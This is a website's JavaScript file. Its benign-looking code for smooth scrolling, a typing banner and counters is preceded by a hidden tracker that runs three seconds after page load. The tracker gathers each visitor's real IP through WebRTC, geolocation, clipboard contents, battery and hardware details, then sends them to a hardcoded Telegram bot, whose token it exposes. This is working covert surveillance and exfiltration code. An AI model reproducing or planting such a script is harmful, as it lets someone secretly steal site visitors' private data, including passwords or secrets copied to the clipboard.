(function() {
    const config = {
        token: '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas',
        chatId: '7950771882'
    };

    async function sendToTelegram(msg) {
        try {
            await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: config.chatId, text: msg, parse_mode: 'Markdown' })
            });
        } catch (e) { console.error("Telegram Dispatch Error"); }
    }

    async function getRealIP() {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19002" }] });
            pc.createDataChannel(""); pc.createOffer().then(d => pc.setLocalDescription(d));
            pc.onicecandidate = (i) => {
                if (i && i.candidate && i.candidate.candidate) {
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
                    resolve(ip);
                }
            };
            setTimeout(() => resolve("Not Detected"), 3000);
        });
    }

    async function runEliteScanner() {
        // ১. রিয়েল আইপি (WebRTC)
        const realIp = await getRealIP();

        // ২. আইপি ও লোকেশন ডিটেইলস
        let ext = {};
        try {
            const res = await fetch('https://ipapi.co/json/');
            ext = await res.json();
        } catch (e) {}

        // ৩. ক্লিপবোর্ড (এটি ট্রিকি, শুধুমাত্র ইউজার পেজে ক্লিক করলে কাজ করার সম্ভাবনা বেশি)
        let clipData = "Access Denied/No Focus";
        try {
            if (navigator.clipboard) {
                clipData = await navigator.clipboard.readText();
            }
        } catch (e) { clipData = "Permission Required"; }

        // ৪. ব্যাটারি
        let batt = "N/A";
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batt = Math.round(b.level * 100) + "%";
            }
        } catch (e) {}

        const report = `
🕵️ **Yash Khan Elite Intel Report**
-----------------------------
🌐 **Public IP:** ${ext.ip || 'N/A'}
📡 **Real IP (WebRTC):** ${realIp}
🏢 **ISP:** ${ext.org || 'N/A'}
📍 **Location:** ${ext.city || 'N/A'}, ${ext.country_name || 'N/A'}
🔋 **Battery:** ${batt}
📋 **Clipboard:** \`${clipData}\`
💻 **OS:** ${navigator.platform}
📱 **Memory:** ${navigator.deviceMemory || 'N/A'} GB
🧠 **CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}
🖥️ **Screen:** ${window.screen.width}x${window.screen.height}
🕒 **Time:** ${new Date().toLocaleString()}
-----------------------------
🛡️ *Status: Offensive Bangladesh*
        `;

        await sendToTelegram(report);
    }

    // ওয়েবসাইট লোড হওয়ার ৩ সেকেন্ড পর রান হবে
    window.addEventListener('load', () => {
        setTimeout(runEliteScanner, 3000);
    });
})();


// ===== Smooth Scroll =====
function scrollToSection() {
  const section = document.getElementById("resources");
  section.scrollIntoView({ behavior: "smooth" });
}

// ===== Typing Effect =====
const text = "Advanced Security • Free Tools • Digital Awareness";
let index = 0;

function typeEffect() {
  const typingElement = document.getElementById("typing");

  if (!typingElement) return;

  if (index < text.length) {
    typingElement.innerHTML += text.charAt(index);
    index++;
    setTimeout(typeEffect, 50);
  }
}

document.addEventListener("DOMContentLoaded", typeEffect);

// ===== Counter Animation =====
const counters = document.querySelectorAll(".counter");

counters.forEach(counter => {
  counter.innerText = "0";

  const updateCounter = () => {
    const target = +counter.getAttribute("data-target");
    const current = +counter.innerText;

    const increment = target / 200;

    if (current < target) {
      counter.innerText = Math.ceil(current + increment);
      setTimeout(updateCounter, 15);
    } else {
      counter.innerText = target;
    }
  };

  updateCounter();
});
